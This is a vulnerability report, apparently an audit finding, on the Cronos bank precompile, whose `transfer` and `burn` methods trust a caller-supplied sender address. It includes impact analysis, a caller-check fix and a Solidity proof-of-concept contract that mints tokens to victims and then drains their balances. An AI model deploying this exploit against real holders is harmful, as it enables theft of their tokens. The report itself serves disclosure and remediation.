### Title
Unauthenticated `sender` in Bank Precompile `transfer` Allows Any Contract to Drain Arbitrary Holders' `evm/<contractAddress>` Tokens — (`File: x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The bank precompile's `transfer` method accepts a caller-supplied `sender` address and uses it directly as the `from` account in `bankKeeper.SendCoins`, with no check that `sender == contract.Caller()`. Any EVM contract can therefore transfer `evm/<itsOwnAddress>`-denomination native bank tokens out of any victim's account without the victim's consent.

---

### Finding Description

In `BankContract.Run`, the `TransferMethodName` branch unpacks `sender` from calldata and passes it verbatim to `bankKeeper.SendCoins`:

```go
sender := args[0].(common.Address)   // fully attacker-controlled
recipient := args[1].(common.Address)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())  // evm/<callingContract>
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

There is no guard of the form `sender == contract.Caller()`. The `denom` is correctly scoped to the calling contract (`evm/<callerAddress>`), but the **source account** for the transfer is entirely attacker-chosen.

The same structural flaw exists in the `burn` branch: `recipient` (the address to burn from) is also taken from calldata without verifying it equals `contract.Caller()`. [2](#0-1) 

The intended usage pattern, shown in `TestBank.sol`, always passes `msg.sender` explicitly:

```solidity
return bank.transfer(msg.sender, recipient, amount);
``` [3](#0-2) 

But the precompile enforces nothing — any contract can substitute an arbitrary victim address.

---

### Impact Explanation

**Critical — Unauthorized transfer of `evm/<contractAddress>` denomination tokens.**

`evm/<contractAddress>` tokens are first-class native bank module coins. They are minted by a contract via `bank.mint`, held in user Cosmos accounts, and can back ERC-20 balances 1-for-1 (as shown by `moveToNative`/`moveFromNative` in `TestBank.sol`). A contract that has issued these tokens to users can call `bank.transfer(victimAddr, attackerAddr, amount)` at any time to drain every holder's balance without any on-chain authorization from the victim. [4](#0-3) 

---

### Likelihood Explanation

Any unprivileged actor can deploy an EVM contract on Cronos and call the bank precompile at address `0x0000000000000000000000000000000000000064`. No admin key, governance vote, or special permission is required. The attack is executable in a single transaction once victims hold `evm/<attackerContract>` tokens (e.g., after a token sale, liquidity provision, or reward distribution). [5](#0-4) 

---

### Recommendation

Add a caller-identity check at the top of the `TransferMethodName` branch (and analogously for `BurnMethodName`):

```go
if sender != contract.Caller() {
    return nil, errors.New("bank transfer: sender must equal the calling contract")
}
```

This mirrors the authorization model already enforced for `mint_by_cronos_module` in CRC20/CRC21 contracts, where `require(msg.sender == module_address)` gates privileged operations. [6](#0-5) 

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
}

contract AttackerContract {
    IBankModule constant bank =
        IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: issue evm/<this> tokens to victims (e.g. via a token sale)
    function issueTokens(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: drain all victims at will — no victim signature required
    function drain(address victim, uint256 amount) external {
        // sender = victim, but caller is AttackerContract
        // denom  = evm/<AttackerContract>
        bank.transfer(victim, msg.sender, amount);
    }
}
```

`drain()` succeeds because `BankContract.Run` uses the calldata `sender` (victim) as `from` in `bankKeeper.SendCoins` without verifying it equals `contract.Caller()` (AttackerContract). The victim's `evm/<AttackerContract>` balance is transferred to the attacker with no authorization from the victim. [7](#0-6)
